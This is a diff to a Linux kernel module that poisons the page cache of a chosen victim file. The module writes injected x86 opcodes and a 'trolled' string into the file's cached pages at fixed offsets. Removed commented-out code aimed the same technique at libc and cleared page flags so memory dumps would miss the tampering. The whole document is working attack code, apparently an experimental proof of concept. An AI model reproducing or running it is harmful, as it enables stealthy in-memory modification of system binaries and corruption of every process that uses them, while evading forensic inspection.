@@ -16,16 +16,9 @@
 char* troll = "trolled";
 
 
-char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x5C, 0xBE, 0x08, 0x00, 0x90, 0x90, 0x90, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }; //append with a shit ton of nops
+char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 }  ; //append with a shit ton of nops
 int init_module(void)
 {
- 	char* current_mapping; //
-  char* new_page_ptr;
-  char* old_page_ptr; //these are kmapped addresses
-  struct page* new_page; //this is the page to insert
-  struct page* old_page;
-  char* ptr;
-  int count;
   char* path = TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE)
   	struct inode* i = get_file_path(path);//
   if(!i){
@@ -40,60 +33,9 @@ int init_module(void)
   }
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
 
-  new_page = alloc_page(GFP_KERNEL);
-  old_page = find_page_inode(i, 0x00107c10); //initial test to see if it functions. This will output to dmesg
-  if(!old_page){
-    return 0;
-  }
-  new_page_ptr = kmap(new_page);
-  old_page_ptr = kmap(old_page);
-  printk(KERN_INFO "Character of old page: %c\n", *(old_page_ptr+ pg_off(0x00107c10)));
-  printk(KERN_INFO "page flags of old page: %lu\n", old_page -> flags);
-
-
-
-
-  memcpy(new_page_ptr, old_page_ptr, 4096);
-  //old page is entirely useless
-  for(count = 0, ptr = new_page_ptr + pg_off(0x00107c10); count<17; count++, ptr++){
-    *ptr = trolling_opcodes[count];
-  }
-  //printk("%c\n", *(new_page_ptr+ pg_off(0x00107c10)));
- 
-  kunmap((void*)new_page_ptr);
-  kunmap((void*)old_page_ptr); 
-  //SetPageReferenced(new_page);
-  SetPageMappedToDisk(new_page);
-  SetPageUptodate(new_page);
-  replace_page(old_page, new_page);
-
-
-  //retry getting page
-  old_page = find_page_inode(i, 0x00107c10);
-  old_page_ptr = kmap(old_page);
-  printk(KERN_INFO "Page flags of new page: %lu\n", old_page -> flags);
-  printk(KERN_INFO "Character of new page: %c\n", *(old_page_ptr+ pg_off(0x00107c10)));
-  kunmap((void*)old_page_ptr);
-  
-
-  if(!old_page){
-    return 0; //don't continue into flag checking if we haven't initalized a page
-  }
-
-  if(PageDirty(old_page)){
-    printk(KERN_INFO "Its Dirty!\n");
-  }else{
-    printk(KERN_INFO "Its clean!\n");
-  }
-  if(PagePrivate(old_page)){
-    printk(KERN_INFO "It has page buffers");
-
-  }else{
-    printk(KERN_INFO "It does not have page buffers");
-  }
-  
-
-   //prevent writeback
+  //unmap_page(i, 0x00107c10);
+  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21);
+  write_string_page_cache(i, 0x00191027, troll, 8);
   return 0;
 }
 
@@ -104,49 +46,4 @@ void cleanup_module(void)
 MODULE_LICENSE("GPL");
 
 
-  /*
-  page = find_page_inode(i, 0);
-  if(!page){
-    printk(KERN_INFO "Page failed\n");
-    return 0;
-  }
-  map = kmap(page);
-
-  *((char*)map) = 'A';
-  kunmap(page);
-
-  */
-
-  /*
-  THE CODE BELOW IS HIGHLY DESTRUCTIVE. DO NOT, UNDER ANY CIRCUMSTANCE, RUN IT AGAINST THE REAL LIBC
-
-  */
-
-
-  /*page = find_page_inode(i, 0x0019d030); //ok so this actually works
-  printk("%lu\n", page->flags);
-  if(!page){
-    printk(KERN_INFO "Page failed\n");
-    return 0;
-  }
-  map = kmap(page);
-  ptr = (char*)map + pg_off(0x0019d030); //.rodata location
-  for(count = 0; count<7; count++,ptr++){ //doin a little trolling
-    *ptr = *(troll+count);
-  }
-  kunmap(map);
-  ClearPageReferenced(page); //the page dump won't dump referenced pages so clear the bit
-  page = find_page_inode(i, 0x001111d4);
-
-  if(!page){
-    printk(KERN_INFO "Page failed\n");
-    return 0;
-  }
-  map = kmap(page);
-  ptr = (char*)map + pg_off(0x001111d4);
-  for(count = 0; count < 17; count++, ptr++){  //it iterativly copies the opcodes. That is problematic with synchronous access.
-    *ptr = trolling_opcodes[count];
-  }
-  kunmap(map);
-  printk("%lu\n", page->flags);
-  */
+  
